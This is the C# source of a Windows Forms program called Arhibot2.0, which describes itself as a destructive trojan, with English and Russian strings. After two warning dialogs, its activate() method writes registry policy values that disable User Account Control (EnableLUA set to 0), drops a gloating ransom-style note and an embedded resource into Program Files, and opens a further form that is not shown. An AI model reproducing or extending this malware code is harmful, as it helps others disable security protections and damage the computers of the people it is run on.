﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using Microsoft.Win32;

namespace Arhibot2._0
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
        }

        public static string getwarnmsg()
        {

            var sb = new StringBuilder();
            
            if (Program.lang == "en")
            {
                sb.Append("You trying to run this program.\nThis is malicious malware, which can damage your system without repair.\nAre you sure you want to run this software?\nPress Yes to continue, otherwise click No.");
            }
            else
            {
                sb.Append("Вы пытаетесь запустить эту программу.\nЭто вредоносный малвар, который может уничтожить вашу систему без возможности восстановления\nВы уверены что вы хотите запустить эту программу?\nНажмите 'Да' для продолжения, в противном случае 'Нет'.");
            }
            return sb.ToString(); // возвращаем текст в стринг-формат.
        }
        public static string getwarnmsg2()
        {

            var sb = new StringBuilder();

            if (Program.lang == "en")
            {
                sb.Append("THIS IS LAST WARNING\nCREATORS WON'T BE RESPONSIBLE FOR DAMAGES!\nIF YOU START THIS PROGRAM, YOUR SYSTEM WILL BE DESTROYED AND YOU CANNOT REPAIR IT.\nARE YOU REALLY WANT TO RUN THIS MALICIOUS PROGRAM, RESULTING WITH A DIED MACHINE?");
            }
            else
            {
                sb.Append("ЭТО ПОСЛЕДНЕЕ ПРЕДУПРЕЖДЕНИЕ\nРАЗРАБОТЧИКИ НЕ БУДУТ НЕСТИ ОТВЕТСТВЕННОСТЬ ЗА УЩЕРБ В ЛЮБОМ ВИДЕ!\nЕСЛИ ВЫ ЗАПУСТИТЕ ДАННУЮ ПРОГРАММУ, ВАША СИСТЕМА УНИЧТОЖИТСЯ И ВЫ НЕ СМОЖЕТЕ ЕЕ ВОССТАНОВИТЬ!\nВЫ РЕАЛЬНО ХОТИТЕ ЗАПУСТИТЬ ПРОГРАММУ, КОТОРАЯ ПРИВЕДЕТ К УНИЧТОЖЕННОЙ СИСТЕМЕ?");
            }
            return sb.ToString();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            string msg = getwarnmsg();
            
                if (MessageBox.Show(msg, "Arhibot2.0", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
                {
                    Application.Exit();
                }
                else
                {
                    Last_Warn();
                }
            
            
        }
        public void Last_Warn()
        {
            string msg = getwarnmsg2();
            if (MessageBox.Show(msg, "Arhibot2.0", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
            {
                Application.Exit();
            }
            else
            {
                activate();
            }
        }

        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        public static string gettext()
        {

            var sb = new StringBuilder();

            if (Program.lang == "en")
            {
                sb.Append("Trojan Arhibot is activated!" + Environment.NewLine + "Please wait for payloads, and enjoy the last minutes of your computer :D" + Environment.NewLine +  Environment.NewLine + "enjoy lmao"); // Пришлось через Environment.Newline, т.к "\n" НЕ работает.
            }
            else
            {
                sb.Append("Вирус Arhibot активирован!" + Environment.NewLine + "Пожалуйста ждите постоянных нагрузок, и насладитесь последними минутами использования этим компьютером))" + Environment.NewLine + Environment.NewLine + "наслаждайтесь ха)"); // здесь точно также
            }
            return sb.ToString();
        }
        public void activate()
        {
            RegistryKey rk = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);
            RegistryKey key = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
            string textpath = @"C:\Program Files\warning.txt";
            string textvirus = gettext();
            File.WriteAllText(textpath, textvirus);
            Process.Start(textpath);
            Extract("Arhibot2._0", "C:\\Program Files", "Resources", "Custom.jpg");
            this.Hide();
            var NewForm = new Form2();
            NewForm.ShowDialog();
            this.Close();
        }
    }
}
